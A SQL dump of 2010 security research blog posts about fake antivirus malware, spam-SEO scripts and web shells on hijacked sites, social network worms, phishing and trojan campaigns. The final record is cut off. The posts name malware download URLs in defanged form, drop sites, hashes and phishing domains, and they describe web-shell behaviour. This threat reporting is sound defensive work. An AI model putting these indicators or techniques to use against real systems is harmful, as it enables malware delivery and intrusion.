INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (473, 'Best And Worst Antivirus Against Fake AV Malware', 'Julien Sobrier', 'September 30, 2010', 'The detection rate for fake antivirus malware amongst antivirus vendors is usually below 25%. I was curious to see which AV engines were the best and worst, when it comes to blocking malicious fake AV executables. In order to figure it out, I obtained 16 different samples which I uploaded to VirusTotal in order to get the detection information on 43 AV engines.Before I get into the results, it is interesting to note that fake AV perpetrators often reuse the same names for different executables. For example, the malicious executable scanner.exe, was found with different file sizes, which resulted in different AV detection results, depending on where the executables came from. The opposite is also true. The same exact file (same size, same MD5) was found on different domains under different names. I made sure my 16 samples were indeed different files to not skew the comparison.VirusTotal - Detection information for one sampleNo absolute protectionThe average detection rate was found to be 30%. The detection rate for each sample varied from 12% to 49%.The best AV engine detected 13 of the 16 samples (81% detection rate). Only 13 out of the 43 AV software detected at least 50% of the samples.Click on the image to see the detection rate for all AV softwareBest AV solutions The best AV solution to detect fake AV malware is Sophos, with an 81% detection rate, followed by Sunbelt (75%).5 best AV solutions against fake AV malwareThe 13 AV engines which detected at least 50% of the malicious executables are (in alphabetical order):AhnLab-V3AntiVirBitDefenderF-SecureGDataKasperskyNOD32PCToolsSophosSunbelt SymantecTrendMicroTrendMicro-HouseCallWorst AV software The following 7 AV engines did not detect any of the samples:ClamAVeSafeFortinetJiangminTheHackerViRobotVirusBusterAVG, a popular free antivirus, detected 19% of the samples, the same as McAfee. ConclusionThe AV vendors need to step up and improve their detection. Samples are easily found. I\'ve explained how to get to the fake AV pages from a Google query of the Hot Trends in previous posts.-- Julien', 'AntiVirus;Malware', 'https://www.zscaler.com/blogs/research/best-and-worst-antivirus-against-fake-av-malware');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (474, '\"Hot Video\" Pages: Analysis Of An Hijacked Site (Part III)', 'Julien Sobrier', 'September 29, 2010', 'In Part I and II, I analyzed files on a hijacked site that was part of the \"Hot Video\" campaign. While doing the analysis, I identified other hijacked domains and found additional scripts used to create the \"Hot Video\" pages. Some of them were much more elaborate.    page.php and page.dot    These pages present a slight variation of the \"Hot Video\" scripts seen in Part I and Part II. The template is loaded from page.dot instead of news.dot. Otherwise the script works the same way, however, the redirection to the malicious page is done by a different site, namely rapidejdr.fr. Interestingly, this website was already redirecting users to fake AV sites in July 2010. I did warn the owner of the site at the time, but apparently it fell on deaf ears.      trends.php    This script is very interesting. It does basically the same thing as news.php and page.php, displaying the \"Hot Video\" page and creating spam content, but in a different way. Checks for bots are also more thorough.    Here are the main differences:    is_search_bots()    The previous examples were only looking at the User-Agent header, to differentiate between users and bots. This version includes several other checks:      	Client IP address check - The script has a list of IP addresses/ranges which are considered to be bots. They are known Google IP addresses. A similar list can be seen at SEO-Wolf. It is interesting to see that, once again, attackers care primarily about Google, not Yahoo or Bing.        	  		  			  		  		  			List of blacklisted IP addresses  		  	        	Referer header check - If you do a search for \"site:example.com\", the request to the page is considered as being done by a bot  	User-Agent header check - Blackberry and Samsung browsers are flagged as bots  	Referer header must contain google or search.  	Referer header must contain q=.        	  		  			  		  		  			Part of the is_search_bots() function  		  	      sendPage($keyword)    The scripts display slightly different pages for bots and users. They use two templates: trend.dot for users and default.dot for bots. The differences between the pages generated are designed to trick Google into thinking this is not a spam page. The page delivered to search engine bots has the following characteristics:           	No \"Hot Video:\" string in the title  	The Flash overlay on the page is not created, so there is no redirection to a fake AV site      Otherwise, the content of the 2 pages is the same as detailed in a previous post: spam content, links to other spam pages, and a picture of the fake Youtube player.                     	  		  			  		  		  			The sendPage function  		  	                     getNewTrends()    This function did not exist in the previous scripts. The \"Hot Video\" pages include the 20 most popular searches from Google Hot Trends for the same day. This means new links to fake video pages are created automatically every day.    getTrends()    The spam page also contains links to older Google Hot Trends, taken randomly from the last 25 days:              $address = \"http://www.google.com/trends/hottrends?sa=X&date=\".date(\"Y-m-d\",time() - 60*60*24*rand(1,25));           getAdvKeys($key)    Another list of spam keywords is generated using Google Suggest, the list of suggestions which Google shows you as you type your keywords in the search engine. This means the fake pages are created not only for the popular searches, but also for searches suggested by Google.                               	  		  			  		  		  			Source of the function generating new keywords for spam  		  	             Another difference with the previous script is that there is no hash done on the keywords to ensure that the request includes specific parameters.    Sitemap    As with the other \"Hot Video\" pages, there is a link to a sitemap page which lists other spam pages. But in this example, the sitemap is generated from the content on a different domain: byethost17.com. This page can create a list of spam pages for any domain and the base URL is sent as a URL parameter.                               	  		  			  		  		  			sitemap.html is generated from a different domain  		  	             Conclusion    This script looks like it was written by the same group as the other \"Hot Video\" scripts. However, it\'s functionalities are more like the other Blackhat spam SEO scripts I\'ve seen, with extensive checks to separate users from bots, with different content displayed to each.    -- Julien', 'Compromise;Malware', 'https://www.zscaler.com/blogs/research/hot-video-pages-analysis-hijacked-site-part-iii');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (475, 'New Orkut Worm: “Bom Sabado!” – Good Saturday For Orkut Users', 'ThreatLabz', 'September 25, 2010', 'Today, on 25th September 2010, a new worm affecting Orkut emerged. I received several calls from friends asking about this new Orkut worm. They told me that their scrapbook was flooded with text messages called “Bom Sabado!” and they were forcefully made to join some fake Orkut communities. This worm seems to be created by a Portuguese hacker as the meaning of this message is “Good Saturday” in Portuguese. I found the scrapbook of one of my friends flooded with the same malicious messages. Here is the screenshot,\r\n\r\n\r\n\r\nI looked at the source code of the scrapbook page and found that a malicious iframe is being used to spread the worm. Here is what the malicious code looks like:\r\n\r\n\r\n\r\nThe malicious iframe points to “tptools.org/worm.js”. I tried to download this malicious JavaScript file but the domain no longer exists. I was however able to find the source code for this malicious JavaScript file on a Google forum. The obfuscated JavaScript inside the file can be seen below:\r\n\r\n\r\n\r\nThe script was easy to decode and I too found the decoded source code on the internet. This malicious JavaScript creates some HTTP GET and POST requests to Orkut. It then obtains the list of friends for the infected user and sends the same malicious message to them with embedded hidden Iframe. This malicious JavaScript also forces infected users to join a few fake Portuguese communities as listed below,\r\n\r\nhttp://www.orkut.co.in/Main#Community?cmm=106691341\r\n\r\nhttp://www.orkut.co.in/Main#Community?cmm=106698628\r\n\r\nhttp://www.orkut.co.in/Main#Community?cmm=558494\r\n\r\nhttp://www.orkut.co.in/Main#Community?cmm=6\r\n\r\nhttp://www.orkut.co.in/Main#Community?cmm=106698808\r\n\r\nThis worm does not perform any truly harmful activities, but instead forces infected users to join different fake communities. It looks like the motive of the attacker behind this is simply to see how many he could infect. The screenshots of different communities involved in the attack (below), show that within few hour,s this worm infected many users:\r\n\r\n\r\n\r\n\r\n\r\nThis new worm shows how quickly an attack can spread and how dangerous social networking sites can be. Even though this worm didn\'t perform any malicious activities, it could have been used to steal sensitive information like passwords, personal information, etc. This was certainly not a \'Good Saturday\' for Orkut users to be sure. Do not open your Orkut scrapbook until Orkut fixes the problem, even though the malicious site is down.\r\n\r\n“Bad Saturday” for Orkut users.\r\n\r\nUmesh', 'Malware', 'https://www.zscaler.com/blogs/research/new-orkut-worm-bom-sabado-good-saturday-orkut-users');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (476, 'Fake AV Moving From .co.cc To .cz.cc', 'Julien Sobrier', 'September 23, 2010', 'I\'ve mentioned before that most of the fake AV sites were hosted on the sub-domain of co.cc which offers free DNS services.    It is certainly true that the domain is still hosting most of the fake AV sites, however, they are also doing a lot of cleanup. All the malicious sites we have reported to them have been removed within 24 hours. Many sites I\'ve checked recently have been taken down.         	  		  			  		  		  			Fake AV domain was taken down  		  	        While we\'re still seing new co.cc fake AV sites, we\'ve seen an increase of such sites hosted on cz.cc. They offer free sub-domains, and free hosting as well.                	  		  			  		  		  			Attackers take advantage of free hosting services  		  	        Attackers will keep changing providers to find a more hospitable home, a place where they are not shut down quickly. It took several months for co.cc registrars to first take actions against attackers abusing their service, certainly enough time to infect plenty of unaware users and we expect the same for cz.cc.    -- Julien', 'Malware', 'https://www.zscaler.com/blogs/research/fake-av-moving-cocc-czcc');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (477, '\"Hot Video\" Pages: Analysis Of An Hijacked Site (Part II)', 'Julien Sobrier', 'September 22, 2010', 'In Part I of this series, I analyzed the files used in coordination with news.php to create the malicious spam \"Hot Video\" pages. In this second post, I\'ll analyze the rest of the files found on the site:.cch/ - folder contains thousands of spam pagespage.php - displays the \"Hot Video\" page .sys.php - execute any PHP code and upload filesg------.php (censored) and a few similar pages - execute any command and upload filespage.php and .cch/page.php is nearly identical to the script news.php described previously: it displays the fake AV pages using the news.dot template. It uses sites.txt and key.txt to get the list of other spam pages, etc. The script is also obfuscated using FOPO.Part of the de-ofuscated PHP codeThe only difference with news.php is that the spam content is stored in .cch/ instead of .news/. The other 2 PHP scripts are not related to the \"Hot Video\" spam pages, but they are very dangerous for any website affected by this attack as they open it up to further compromise as discussed below..sys.phpThis PHP script is not encrypted. It is very short, but very dangerous. It executes any PHP code entered in a POST request, and can upload any file, including .php files that can be executed on the site later.Full source codeLooking at the source code is not enough to be able to use it. Indeed, the script runs only if the correct parameter key=value is sent. The code starts with:if (sha1(md5(sha1($_POST[\'key\']))) == \"697e86fd67cd215cfa03b98a5c3a1d7b34a79534\")So you need to find the right value whose SHA1 of MD5 of SHA1 (!)  is equal to \"697e86fd67cd215cfa03b98a5c3a1d7b34a79534\", otherwise the script does not do anything.g------.php (censored)I\'ve found a few.php scripts with similar names, but always slightly different, on several hundred websites. Unfortunately for the webmasters, this means that a simple Google search can let anybody take full control of their website.The script allows anybody to run any shell command on the site, run any PHP code, and to upload any file. It is not obfuscated, and unlike .sys.php, there is no trick to prevent people from using it. To protect the websites which have been hijacked, and now include these scripts, I won\'t go into further details regarding this file.ConclusionThe scripts used to create the fake \"Hot Video\" pages are pretty simple. They work autonomously, so it is not possible to track the origin, or individual that may be behind the attack. Hundreds of websites have been compromised.These hijacked sites are mostly online stores. They are dangerous not only for their users, whose information can be easily stolen, or could be presented with all kinds of malware, but for Internet users in general. -- Julien', 'Analysis;Phishing', 'https://www.zscaler.com/blogs/research/hot-video-pages-analysis-hijacked-site-part-ii');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (478, 'Twitter ReTweet Spam (XSS)', 'ThreatLabz', 'September 21, 2010', 'This morning before I even logged into my system, I was receiving inquiries about the Twitter Spam going around. The source looks like:      And appears in Twitter as:    For those unfamiliar with t.co, it is Twitter\'s link service, which provides URL shortening as well as checks to ensure that the link doesn\'t go to a known malicious site (see About Twitter\'s Link Service for more info). You can see from the source of the tweet, that it is leveraging a cross-site scripting (XSS) vulnerability so that the scripting code following the \"@\" character is executed within the victim\'s browser, and just by mousing over the tweet you are retweeting it. The tweet name / retweet value varies. (a.no has been seen in addition to the t.co domain).    Doing a Twitter search for \"Onmouseover\" provides a laundry list of URLs and \"victims\" of this spam. The results of the spam campaign are tweet spam (annoyance) and a likely strain on Twitter services from the increase in retweets. After doing a Twitter search, after a few minutes, the search results showed over 30K more tweets since my initial search - this illustrates how rapidly spreading the XSS retweet spam is being spread.    Digging a bit deeper into this reveals that it was an Australian teenager going by the handle zzap that discovered the XSS vulnerability whereby arbitrary script following the \"@\" character is executed (ref. NetCraft). Cross-site request forgery and cookie stealing attacks have been demonstrated leveraging the XSS vulnerability as well. Currently there are a number of Twitter worms leveraging this vulnerability (ref. F-Secure).    Some security precautions for users to consider:      	Avoid accessing your Twitter account from a browser, consider using a Twitter client  	If accessing your account via browser turn off JavaScript or use NoScript        Update from Twitter:', 'Abuse', 'https://www.zscaler.com/blogs/research/twitter-retweet-spam-xss');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (479, '\"Hot Video\" Pages: Analysis Of An Hijacked Site (Part I)', 'Julien Sobrier', 'September 20, 2010', 'I was fortunate enough to find a hijacked site which was being used to host fake \"Hot video\" pages, which I\'ve blogged about before. However, this time around, the site had directory listings enabled. As such, I could view all the files used in the attack, including source code of the php files which display the fake video page and redirect users to a malicious pages. This provided insight into how the attack actually works.Here is the list of interesting files in the /images/ directory:error_log - somebody tried to cover their tracks?news.dot - template for the Hot video pagesitemap.php - displays a list of spam pages from other domainssites.txt - list of spam pages from other domainskey.txt - a list of popular Google searches news.txt - log of crawler visits.news/ - folder containing thousands of spam pages.cch/ - folder containing thousands of spam pagesg------.php (censored) and a few similar pages - execute external commands and upload files.sys.php - execute any PHP code and upload file page.php - displays the \"Hot Video\" pagenews.php - display the \"Hot Video\" pagestyle.css - style sheet used on fake video pageload.swf - Flash file which redirects the user to the malicious pageplayer.gif - image of the fake Youtube videoHere are some information about some of the files. error_logThis file shows a series of PHP errors. On the website, it contained a list of rmdir (remove a local folder) commands that had failed. It appears that somebody had attempted to delete the folders which contain the spam pages, which may have resulted from a failed attempt to clean a site by the webmaster, or perhaps a failed attempt to cover the hijacking by the attacker.Failed attempt to remove the folder containing the spam pages.sitemap.php, sites.txt  key.txtkey.txt contains the list of popular searches from Google Hot Trends. A spam page is created for each of the searches.List of popular searchesThe file reviewed, contained 8,000 popular searches.sites.txt contains a list of hijacked sites which host spam pages. There are 139 domains listed.List of hijacked sites hosting spam pagesThese 2 text files are used by sitemap.php to generate HTML pages with links to a total of 1,112,000 (8,000 x 139) spam pages.HTML links to spam pagessitemap.php generates different lists each time the page is accessed and shows a few hundred links each time.Part of the sitemap.php PHP source codeThe source shows that the same script, news.php, is used on all the 139 domains to display the fake video pages.news.txtnews.txt contains the logs from search engine crawlers that have accessed the spam page news.php.Information about crawlers accessing he spam pagesThe log file contained 29,983 lines. Google started to crawl the spam pages on August 15th. Here is the breakdown of crawler access:Google: 29,402Yahoo!: 580MSN: 198% of the crawler access to this page was done by Google, so it is not surprising that Google search results contained more spam links than Yahoo! or Bing. Bing visited the spam page on September 6th, and Yahoo! for the first time on August 27th, 12 days after Google. This plays well with what I\'ve described before: Yahoo! is late to add spam pages to its search results, and Bing does not seem to contain any..news/This folder contains about 25,000 pages.Spam pagesThe file name is based on the popular searches. For each search, there is a -new.html file,  a -key.html file, and a .html file.The -new.html and -key.html pages look similar. The -new.html files contain links to the malicious \"Hot Video\" page on other domains, whereas -key.html files contain links to the fake pages on the same domain, for example news.php?page=tour+de+francecheck=f7b972cf78d306834a08b9655bff1822Links to \"Hot Video\" pagesThe 3rd file contains a spam page, the same type we\'ve seen for other blackhat spam SEO attacks.Spam pageThe content of these 3 files is combined to create the overall \"Hot Video\" spam page.news.dotThis is the template for the \"Hot Video\" spam page.There are 4 main sections in the template:the fake Youtube page, with the flash file load.swf to redirect users to the malicious site, player.gif for the picture of the fake Video player and style.css for the style sheeta list of links to \"Hot Video\" pages on other domainsa list of links to \"Hot Video\" pages on the same domainspam content for a specific searchHTML templatenews.phpThis PHP script is obfuscated with \"FOPO - Free Online PHP Obfuscator v1.2: http://www.fopo.com.ar\".Obfuscated PHP codeOnce de-obfuscated, the code is pretty simple.The script does two main actions:display the spam pagecreate spam contentDe-ofuscated code for news.phpThe script displays the same page to crawlers and regular users. If the script detects a crawler, it also logs information about the crawl in news.txt. The detection is based on the user agent only - if the string slurp is found, it is the Yahoo crawler, GoogleBot is detected by the string googlebot, and Bing is detected with msnbot.Requests to news.php are involve a query string which contains 2 parameters:the search terma hashThe search term is used to fill out the news.dot template with the corresponding spam content and links to other \"Hot Video\" pages. The hash is used to make sure the request is legitimate, and it is done against the search term and an internal key. This prevents researchers, for example, from accessing the page with random query strings.Surprisingly, there is some \"dead code\". Checks are done for the presence of a file, or the value of an HTTP request, but nothing is then done with it. If a new search term is used, and the corresponding files are not found in the news/ directory, the script generates it\'s own spam content. It does so by requesting the first 100 results of the search term from www.google.ru. It then uses the summary of each search result given by Google to build the page. Images are added to the page as well, but they come from a Bing image search for the given search terms. The links to other \"Hot Video\" pages is built from the files key.txt and sites.txt.The \"Hot Video\" page does not require any command and control server. It can generate new spam pages automatically.The redirection to the malicious site is ultimately done by another hijacked site, compuclick.de. Pages on this domain still redirect to fake AV pages, and they are not blocked by Google Safe browsing: www1.repulseguard10.co.cc, www1.repulseguard3.co.cc, etc.I will detail the other files in later blog posts. Stay tuned!-- Julien', 'Analysis;Compromise', 'https://www.zscaler.com/blogs/research/hot-video-pages-analysis-hijacked-site-part-i');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (480, 'Phishing Sites Hosted On Google Blogpsot', 'Julien Sobrier', 'September 15, 2010', 'We\'ve previously reported on malware that can be accessed from Google search results and malicious executables hosted on Google Code. Additionally, Google Docs has been used for phishing and spam in the past. Now, Blogspot is being used to phish for Twitter credentials.         	  		  			  		  		  			Form to enter your Twitter username and password  		  	             The blogs use different techniques to get a Twitter username and password from users. For example, they may offer to stream news about Jason Bieber or to help with dating, etc. Most of them claim to be the official Jason Bieber fan store,                     	  		  			  		  		  			Blog claims to be the official Jason Bieber fan store  		  	      The form used to gather the Twitter credentials is not actually hosted on blogspot, but rather on urghost.com. It is embedded as an iframe. Ironically, this hosting provider claims to offer a \"Full Computer Cleaning Service package\"! The credentials are sent to peach@urghost.com using a script hosted on a Yahoo account at us.1.p11.webhosting.yahoo.com.    To reassure potential victims, the form states \"WE have made the change to application sharing per Twitter TOS. We do not store User Names/Passwords\". Twitter actually forbids transmission of login/password information from third party web applications, opting instead for the more secure OAuth protocol to communicate with Twitter accounts.    Some of the blogs involved are:                                     	bloggercpaarmy.blogspot.com  	  	twitterinsanityblog.blogspot.com  	  	thewrestlingprofessor.blogspot.com   	  	insanitycelebblog.blogspot.com  	  	gossip4you2.blogspot.com  	  	insanityblog2343.blogspot.com  	  	cupcooking.blogspot.com    	  	  	  	  	   	   	         I\'ve reported the domains to Google and expect that they will be shut down soon.    -- Julien', 'Uncategorised', 'https://www.zscaler.com/blogs/research/phishing-sites-hosted-google-blogpsot');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (481, 'Attackers Re-create An Entire Facebook Site For Phishing', 'Julien Sobrier', 'September 14, 2010', 'Most phishing sites consist of one login page with perhaps a few additional pages. However, I recently stumbled upon a Facebook phishing site which cloned all the facebook pages: About, Developers, Adverting, Sign up, etc. and even in all of the 64 languages the original site offers!Fake Facebook login pageThe domain of the phishing site is fersos.ru. hxxp://www.fersos.ru/ gives an error as you have to access it with  hxxp://www.fersos.ru/index.html. The website is remarkably well done; all the controls are the same as Facebook.Fake Facebook sign up pageThere is also another Russian domain hosting the same \"clone\" of Facebook: baksko.ru.These sites are not yet listed in Phishtank, and they are not blocked by Google SafeBrowsing.-- Julien', 'Uncategorised', 'https://www.zscaler.com/blogs/research/attackers-re-create-entire-facebook-site-phishing');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (482, 'New PPI Campaign', 'ThreatLabz', 'September 01, 2010', 'PPI being pay-per-install ...This morning I saw some interesting transactions to:hxxp://promoupdate.info/setup###.exewhere ### are numbers, for example, \"519\".MD5: 1568edcd29629f577207d7396646b741VirusTotal results 8/43 (report), detected as (among other names):Win32:Hottrend-BTurns out this is being spread through spammers, SEOers, etc. being financed in a PPI model, something that I have discussed before in the past.  This time I have a screenshot to share related directly to the finance aspect of this particular PPI:This post was created today.  We can see from the PPI ad that those engaging in this particular campaign stand to make between $500 and $800 per 1000 installs (< $1 per install).  The numbers in the executable, like \"519\" correspond to the account for the spammer/SEOer that is monetizing this.  Domain: promoupdate.info Whois billing contact shows likely Russian affiliation: Here is the actual Affiliate Network setup by this guy:Domain: twittre.net (private/masked Whois)(note the RU nameservers)Source of the twittre.net page actual reveals that the Affiliate website is loaded from rich-partners.com:Domain: rich-partners.comNo surprise that the contact details are bogus, but the email address is legit, here\'s a past domain registered with these email credentials:Robtex shows these other domains (all likely other PPI sites) on 91.188.60.10 (Sagade Ltd. <- not a surprise for some) in Latvia, hosting promoupdate.info:', 'Abuse', 'https://www.zscaler.com/blogs/research/new-ppi-campaign');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (483, 'Google Code Hosting Website Used To Spread Malware Again', 'ThreatLabz', 'September 01, 2010', 'Last year, there was discussion of Google Code, a site which allows developers to host their projects, being used to spread malware. We have now found yet another case where Google Code is being used to spread malware. According to Google Code site, “Project Hosting on Google Code provides a free collaborative development environment for open source projects. Each project comes with its own member controls, Subversion/Mercurial repository, issue tracker, wiki pages, and downloads section. Our project hosting service is simple, fast, reliable, and scalable, so that you can focus on your own open source development”. The malicious project in question has about 50+ executable stored in the download section of the project. Here is the screenshot of the malicious content:                       Most of the files are executable files along with zipped “.rar” files. The time stamps show that the files have been uploaded over the course of the last month. This suggests that an attacker is actively using this free service to spread malware. Virustotal results for the first file, show that only 8 antivirus vendors out of 43 flagged the file as malicious. The detection ratio for second file is slightly better than that of the first file.         Let’s analyze first file which is “xin.exe”. When the first file is executed on the system, it will make several GET requests to download additional malware onto the system. Here is the first GET request,                       A request for the “love.txt” file contains additional malware also stored on the Google Code site. Here is the link to an analysis of malware by Sunbelt security. The malware performs significant file, network and process activity to while infecting the system. Here is the packet capture of various requests to receive additional malware.                       Further analysis of all files shows that they are all malicious threats including Trojans horses, backdoors, password stealing Keyloggers for online games such as “World of Warcraft” etc. Analysis of the file resources from ThreatExpert report indicates the possible country of origin is China. Interestingly, Google Code FAQ page says they will take down the whole project if they find malware being hosted on the project.                       The question is how and when the Google Code team scans content hosted on their website to ensure that it’s not infected with malware? The first malicious file was uploaded on June 24, 2010, while this blog was written at the end of August – over a month has passed and still the malicious files are being hosted at the Google Code site. The attacker not only storing old malware but he is also actively uploading new malware on the site. The detection ration by AV vendors varies from reasonable to poor given the specific malware sample. As Google Code is free hosting website for developers, attackers are clearly taking advantage of the site to push their malware.         Have you hosted anything?         UPDATE: 2 September 2010    Google has immediately taken down the project and URL to that project is no longer accessible.    Umesh', 'Malware', 'https://www.zscaler.com/blogs/research/google-code-hosting-website-used-spread-malware-again');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (484, 'Beaconing Leads To Swarft Trojan & Suspicious Netblock', 'ThreatLabz', 'August 31, 2010', 'Often, open-source information helps to confirm our suspicion about certain web transactions being tied to an infection or download of something malicious.  While conducting analysis on the results from some of my scripts that extract out potentially suspicious web transactions, I found web transactions that appear to be tied to a bot with keylogger / drop site functionality.  Searching for open-source information reveals little to no information on the server or threat.The infected host does an HTTP POST every 5 minutes to the URL:hxxp://216.108.234.168/scr1p7-r5.phpThe IP is part of a US netblock, Las Vegas NV Datacenter PREMIANET, swipt out to a customer in the Ukraine (UA):Vladimir Miloserdov SERVERPOINT-CUSTOMER-SYNEJY (NET-216-108-234-166-1) 216.108.234.166 - 216.108.234.197Here is the customer information for this small netblock:CustName:       Vladimir MiloserdovAddress:        So,136City:           DonetskStateProv:      DNPostalCode:     83054Country:        UARegDate:        2009-05-24Updated:        2009-05-24Below is a snippet of the transactions seen.Notice that the size of the POST is larger than the response from the server - over 20000 bytes compared to a very short response of 168 bytes.  This means that the client is regularly pushing a fair amount of data somewhere and not receiving anything other than a very simple acknowledgment back.  In the case of a normal web application, pushing data to a server usually has a larger response such as a webmail or blog interface.Visiting 216.108.234.168 responds with the default Apache response “It works!”Open-source searches show that the IP is blocked in a few block lists due to spam, e.g., Project Honeypot.At a minimum this netblock is suspicious and should be alerted/blocked within your organization.Reaching out to some colleagues, helped to reveal that this beaconing is likely tied to the Swarft Banking Trojan due to the “scr1pt7-r#.php” phone home URL path. This is a relatively new Trojan family, the Microsoft threat entry states, that the Trojan steals data that may “include credit card numbers, tax returns, login credentials or any other informed deemed to be of interest to the attacker. The collected data is then surreptitiously sent to the remote attacker via a variety of electronic means.”  Technical details of the Trojan do not appear to be readily available in the open-source- I am in the process of back tracking and reaching out to the impacted customer to get additional information on the Trojan and the incident.  Any new details will be shared in a follow-up post. Also, if anyone has details on the above-mentioned netblock or Swarft Trojan, feel free to post a comment.', 'Analysis;Malware', 'https://www.zscaler.com/blogs/research/beaconing-leads-swarft-trojan-suspicious-netblock');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (485, 'Help Contribute To The Cloud Security Alliance \'Top Threats\' V2.0', 'Michael Sutton', 'August 30, 2010', 'In March of this year, at RSA 2010, the Cloud Security Alliance, officially unveiled the Top Threats to Cloud Computing. This was a collaborative effort that drew upon the expertise of some of the finest minds in the security industry to compile a list of threats facing both enterprises deploying cloud based solutions and the vendors providing the infrastructure. The original list took several months to compile with input from cloud vendors, consumers and researchers. In the end, the Top Threats to Cloud Computing v1.0 guidance was released, but it was always meant to be a starting point, not the end of the journey.    We\'re now working toward updating the Top Threats and plan to release the v2.0 list at the RSA Europe 2010 conference in October, but we need your help. You may have read v1.0 and thought \"why did/didn\'t they include this particular threat\", well now it\'s your chance to ensure that your voice heard. Whereas v1.0 was compiled by a closed group in the interest of \'putting a stake in the ground\', we want v2.0 and future revisions to be a true open, collaborative effort with submissions from all those concerned.    Here\'s our plan:           	Starting now, you have the ability to propose the inclusion of new threats to the Top Threats list by submitting them online.  	We\'ll compile and summarize all submissions and present them to a judging panel  	The panel will ultimately select the final v2.0 list, which will be released at RSA Europe 2010.           A summary of the v1.0 Top Threats to Cloud Computing is below, but please also see the detailed guidance, which is available here.          	Abuse and Nefarious Use of Cloud Computing    	  		Service Models - IaaS & PaaS  		Description -  By abusing the relative anonymity behind these registration and usage models, spammers, malicious code authors, and other criminals have been able to conduct their activities with relative impunity.  	  	  	Insecure Interfaces and APIs  	  		Service Models - IaaS, PaaS & SaaS  		Description - The security and availability of general cloud services is dependent upon proprietary APIs that may not have been adequately scrutinized.  	  	  	Malicious Insiders  	  		Service Models - IaaS, PaaS & SaaS  		Description - The threat of a malicious insider is amplified for consumers of cloud services by the convergence of IT services and customers under a single management domain, combined with a general lack of transparency into provider process and procedure.  	  	  	Shared Technology Issues  	  		Service Models - IaaS  		Description -  Vulnerabilities within components of the underlying cloud architecture or the virtualization hypervisor could lead to inappropriate levels of control or influence on the underlying platform and/or unauthorized data stores.  	  	  	Data Loss or Leakage  	  		Service Models - IaaS, PaaS & SaaS  		Description -  The threat of data compromise increases in the cloud, due to the number of and interactions between risks and challenges which are either unique to cloud, or more dangerous because of the architectural or operational characteristics of the cloud environment.  	  	  	Account or Service Hijacking  	  		Service Models - IaaS, PaaS & SaaS  		Description -  If an attacker gains access to the credentials of a cloud based platform, they can eavesdrop on activities and transactions, manipulate data, return falsified information, and redirect clients to illegitimate sites.  	  	  	Unknown Risk Profile  	  		Service Models - IaaS, PaaS & SaaS  		Description -  When adopting a cloud service, details or compliance of the internal security procedures, configuration hardening, patching, auditing, and logging are often unknown, leaving customers with an unknown risk profile that may include serious threats.  	  	          See something you don\'t agree with? Then do something about it! Contribute to the v2.0 list.         - michael', 'Cloud', 'https://www.zscaler.com/blogs/research/help-contribute-cloud-security-alliance-top-threats-v20');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (486, '66.220.17.200 A Haven For Swizzor', 'ThreatLabz', 'August 25, 2010', 'Update:Based on a comment, I modified the title to be 66.220.17.200 versus DNSMADEEASY.  Let me explain:DNSMADEEASY provides the resolution / name services for the domains in questionHurricane Electric / C2 Media provides the hosting / IP space (66.220.17.200)Tucows is the registrar for the registered domain namesWhen I was doing the analysis I was looking at free/cheap DNS services and their abuse, which was why I fixated on the name resolution services, DNSMADEEASY.  However, there are multiple players supporting this Swizzor infrastructure and it should be explained as such.Update 2:Also, after I published the post, I checked and found that the hostname portion of the domain does not seem to matter / affect the ability to download the binary payload.  For example,hxxp://garbage.nb.host192-168-1-2.com/bins/int/9kgen_up.intlet\'s you download the binary (where \"garbage\" can be anything).  It is likely that the hostname is used for tracking purposes to identify which sites / trojan packages are most successful.  The listed fully-qualified domain names below are what was seen in the wild.Post:This may not be news for some of you, all it takes is a simple Google for something like host192-168-1-2.com malware.  You’ll see a rich history of abuse from Trojan Swizzor ranging from 2009 to today:host192-168-1-2.com is registered through Tucows and has resolution / name services provided through  DNSMADEEASY.  This robtex report shows the other related domains, each having a varying degree of abuse related to Swizzor:adserver5.comcidhelp.comdns-look-up.comhost-domain-lookup.comhost127-0-0-1.comhost192-168-1-2.comhost255-255-255-0.comlop.comnetbios-local.comnetbios-wait.comrange159-195.comzone-media.comBelow is a brief list of recent domains used to host Trojan Swizzor payloads.  Note the domains used / listed here include: host127-0-0-1.com, host192-168-1-2.com, host-domain-lookup.com, and host255-255-255-0.com:All resolve to the Hurricane Electric IP: 66.220.17.200Note, the above active/live list we provide is much more extensive that what is listed on MalwareURL for example.  The URL paths to the malware within the above domains include:/bins/int/9kgen_up.int/bins/int/upd_admn.int/bins/int/kr3.int/bins/int/tp_map16.intWhile they all have an \"int\" file extension, they are all PE32 executable files.9kgen_up.int (Swizzor variant)MD5: c79cd77012c848f93e0a8dfc28dee992V/T (20/41)upd_admn.int (Swizzor variant)MD5: 43edfa7f55d4331ad2d3f5ca1bb4b999V/T (22/42)kr3.int (Swizzor variant)MD5: ff7d4cbb6aa30bbf58d945e182700fb7V/T (22/41)tp_map16.int (Swizzor variant)MD5: 599ebaed9e147ef8a0b6967dba2da040V/T (24/42)Swizzor is a Trojan that is typically installed via drive-by download or social engineering.  It has the ability to interact with Internet Explorer through Browser Helper Objects (BHOs) to inject ads and to download/install other threats (for additional information see Microsoft\'s threat entry for Swizzor).  In the particular variants that I downloaded, I saw C&C update activity to other related domains, 